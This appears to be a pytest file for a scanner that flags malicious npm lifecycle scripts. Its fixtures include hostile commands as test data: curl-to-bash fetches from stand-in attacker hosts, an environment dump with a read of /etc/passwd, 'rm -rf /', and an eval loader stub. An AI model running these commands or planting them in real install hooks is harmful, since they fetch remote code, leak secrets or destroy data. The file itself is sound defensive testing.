"""
Tests for Milestone 35: Static Lifecycle Script Analysis.

Verifies detection of suspicious patterns in package.json scripts:
- Remote fetch / download (curl, wget, http URLs)
- Code obfuscation / eval
- System tampering / env exfiltration
- Shell spawning (child_process, powershell, cmd.exe)
- Destructive commands (rm -rf /)
- Integration with ScanOrchestrator
"""

from __future__ import annotations

from unittest.mock import patch

import pytest

from backend.scanner.lifecycle import (
    LifecycleScriptScanner,
    analyze_scripts,
    LIFECYCLE_HOOKS,
)
from backend.pipeline.orchestrator import ScanOrchestrator
from backend.database.repository import get_scan_repository, reset_repository_for_testing
from backend.ingestion import RepositoryWorkspace


@pytest.fixture(autouse=True)
def clean_db():
    reset_repository_for_testing()


def test_detect_remote_fetch_curl():
    scripts = {"postinstall": "curl https://evil.com/payload.sh | bash"}
    findings = analyze_scripts(scripts, package_name="malicious-pkg")
    assert len(findings) >= 1
    assert any(f["evidence"][0]["rule_id"] == "REMOTE_FETCH_EXEC" for f in findings)
    assert all(f["severity"] == "CRITICAL" for f in findings if f["evidence"][0]["rule_id"] == "REMOTE_FETCH_EXEC")


def test_detect_eval_obfuscation():
    scripts = {"preinstall": 'node -e "eval(Buffer.from(\'base64payload\', \'base64\').toString())"'}
    findings = analyze_scripts(scripts, package_name="obfus-pkg")
    assert len(findings) >= 1
    rule_ids = {f["evidence"][0]["rule_id"] for f in findings}
    # Should catch at least CODE_OBFUSCATION or SPAWN_SHELL_EXEC
    assert "CODE_OBFUSCATION" in rule_ids or "SPAWN_SHELL_EXEC" in rule_ids


def test_detect_env_exfiltration():
    scripts = {"install": "printenv > /tmp/env_dump && cat /etc/passwd"}
    findings = analyze_scripts(scripts, package_name="exfil-pkg")
    assert len(findings) >= 1
    rule_ids = {f["evidence"][0]["rule_id"] for f in findings}
    assert "SYSTEM_TAMPERING_EXFIL" in rule_ids


def test_detect_shell_spawn():
    scripts = {"postinstall": "powershell -Command Get-Process"}
    findings = analyze_scripts(scripts, package_name="shell-pkg")
    assert len(findings) >= 1
    assert any(f["evidence"][0]["rule_id"] == "SPAWN_SHELL_EXEC" for f in findings)


def test_detect_destructive_command():
    scripts = {"preinstall": "rm -rf /"}
    findings = analyze_scripts(scripts, package_name="nuke-pkg")
    assert len(findings) >= 1
    assert any(f["evidence"][0]["rule_id"] == "DESTRUCTIVE_COMMAND" for f in findings)


def test_benign_scripts_no_findings():
    scripts = {
        "build": "tsc && webpack --mode production",
        "test": "jest --coverage",
        "start": "node server.js",
        "lint": "eslint src/",
    }
    findings = analyze_scripts(scripts, package_name="safe-pkg")
    assert len(findings) == 0


def test_lifecycle_hook_escalation():
    """Hooks like preinstall auto-execute and should escalate severity."""
    scripts = {"preinstall": "powershell -Command something"}
    findings = analyze_scripts(scripts, package_name="escalate-pkg")
    hook_findings = [f for f in findings if f["evidence"][0]["is_lifecycle_hook"]]
    assert len(hook_findings) >= 1
    # preinstall + SPAWN_SHELL_EXEC → escalated to CRITICAL
    assert hook_findings[0]["severity"] == "CRITICAL"


def test_non_lifecycle_script_no_escalation():
    """Custom scripts that are not lifecycle hooks should not escalate."""
    scripts = {"my-custom-script": "powershell -Command something"}
    findings = analyze_scripts(scripts, package_name="custom-pkg")
    assert len(findings) >= 1
    # Non-lifecycle hook → stays HIGH
    assert findings[0]["severity"] == "HIGH"


def test_scanner_class_end_to_end():
    scanner = LifecycleScriptScanner()
    pkg_data = {
        "name": "suspect-pkg",
        "version": "0.0.1",
        "scripts": {
            "postinstall": "node -e \"require('child_process').exec('whoami')\"",
            "build": "tsc",
        },
    }
    findings = scanner.scan_manifest_data(pkg_data)
    assert len(findings) >= 1
    assert all(f["type"] == "suspicious_lifecycle_hook" for f in findings)
    assert all(f["package"] == "suspect-pkg" for f in findings)


def test_scanner_no_scripts_section():
    scanner = LifecycleScriptScanner()
    findings = scanner.scan_manifest_data({"name": "clean-pkg", "version": "1.0.0"})
    assert findings == []


@patch("backend.scanner.osv.OSVScanner.query", return_value=[])
def test_orchestrator_runs_lifecycle_analysis(mock_osv, tmp_path):
    """Verify lifecycle findings flow through the full orchestrator pipeline."""
    import json

    pkg_data = {
        "name": "danger-demo",
        "version": "1.0.0",
        "dependencies": {"express": "^4.18.0"},
        "scripts": {
            "postinstall": "curl https://evil.example.com/install.sh | bash",
            "build": "tsc",
        },
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_data), encoding="utf-8")

    store = get_scan_repository()
    store.create_scan("scan_lc_01", {"scan_id": "scan_lc_01", "status": "pending"})

    with RepositoryWorkspace(workspace_dir=tmp_path, auto_cleanup=False) as ws:
        orchestrator = ScanOrchestrator()
        result = orchestrator.execute_scan("scan_lc_01", ws)

    assert result["status"] == "completed"
    lifecycle_findings = [f for f in result["findings"] if f["type"] == "suspicious_lifecycle_hook"]
    assert len(lifecycle_findings) >= 1
    assert lifecycle_findings[0]["package"] == "danger-demo"
